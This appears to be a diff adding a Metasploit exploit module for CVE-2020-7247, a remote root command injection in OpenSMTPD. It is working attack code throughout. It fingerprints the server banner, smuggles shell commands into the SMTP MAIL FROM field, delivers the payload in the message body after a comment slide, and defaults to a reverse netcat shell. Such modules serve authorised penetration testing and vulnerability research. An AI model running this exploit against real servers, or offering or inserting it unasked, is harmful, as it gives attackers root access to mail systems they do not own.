@@ -1,0 +1,128 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Expect
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'OpenSMTPD MAIL FROM Remote Code Execution',
+      'Description'    => %q{
+        This module exploits a command injection in the MAIL FROM field during
+        SMTP interaction with OpenSMTPD to execute code as the root user.
+      },
+      'Author'         => [
+        'Qualys',                               # Discovery and PoC
+        'wvu',                                  # Module
+        'RageLtMan <rageltman[at]sempervictus>' # Module
+      ],
+      'References'     => [
+        ['CVE', '2020-7247'],
+        ['URL', 'https://www.openwall.com/lists/oss-security/2020/01/28/3']
+      ],
+      'DisclosureDate' => '2020-01-28',
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Privileged'     => true,
+      'Targets'        => [
+        ['OpenSMTPD >= commit a8e222352f',
+          'MyBadChars' => "!\#$%&'*?`{|}~\r\n".chars
+        ]
+      ],
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_netcat'}
+    ))
+
+    register_options([
+      Opt::RPORT(25),
+      OptString.new('RCPT_TO', [true, 'Valid mail recipient', 'root'])
+    ])
+
+    register_advanced_options([
+      OptBool.new('ForceExploit',   [false, 'Override check result', false]),
+      OptFloat.new('ExpectTimeout', [true, 'Timeout for Expect', 3.5])
+    ])
+  end
+
+  def check
+    connect
+    res = sock.get_once
+
+    return CheckCode::Unknown unless res
+    return CheckCode::Detected if res =~ /^220.*OpenSMTPD/
+
+    CheckCode::Safe
+  rescue EOFError, Rex::ConnectionError => e
+    vprint_error(e.message)
+    CheckCode::Unknown
+  ensure
+    disconnect
+  end
+
+  def exploit
+    unless datastore['ForceExploit']
+      unless check == CheckCode::Detected
+        fail_with(Failure::Unknown, 'Set ForceExploit to override')
+      end
+    end
+
+    # We don't care who we are, so randomize it
+    me = rand_text_alphanumeric(8..42)
+
+    # Send mail to this valid recipient
+    to = datastore['RCPT_TO']
+
+    # Comment "slide" courtesy of Qualys - brilliant!
+    iter = rand_text_alphanumeric(15).chars.join(' ')
+    from = ";for #{rand_text_alpha(1)} in #{iter};do read;done;sh;exit 0;"
+
+    # This is just insurance, since the code was already written
+    if from.length > 64
+      fail_with(Failure::BadConfig, 'MAIL FROM field is greater than 64 chars')
+    elsif (badchars = (from.chars & target['MyBadChars'])).any?
+      fail_with(Failure::BadConfig, "MAIL FROM field has badchars: #{badchars}")
+    end
+
+    # Create the mail body with comment slide and payload
+    body = "\r\n" + "#\r\n" * 15 + payload.encoded
+
+    sploit = {
+      nil                   => /220.*OpenSMTPD/,
+      "HELO #{me}"          => /250.*pleased to meet you/,
+      "MAIL FROM:<#{from}>" => /250.*Ok/,
+      "RCPT TO:<#{to}>"     => /250.*Recipient ok/,
+      'DATA'                => /354 Enter mail.*itself/,
+      body                  => nil,
+      '.'                   => /250.*Message accepted for delivery/,
+      'QUIT'                => /221.*Bye/
+    }
+
+    print_status('Connecting to OpenSMTPD')
+    connect
+
+    print_status('Saying hello and sending exploit')
+    sploit.each do |line, pattern|
+      send_expect(
+        line,
+        pattern,
+        sock:    sock,
+        timeout: datastore['ExpectTimeout'],
+        newline: "\r\n"
+      )
+    end
+  rescue Rex::ConnectionError => e
+    fail_with(Failure::Unreachable, e.message)
+  rescue Timeout::Error => e
+    fail_with(Failure::TimeoutExpired, e.message)
+  ensure
+    disconnect
+  end
+
+end
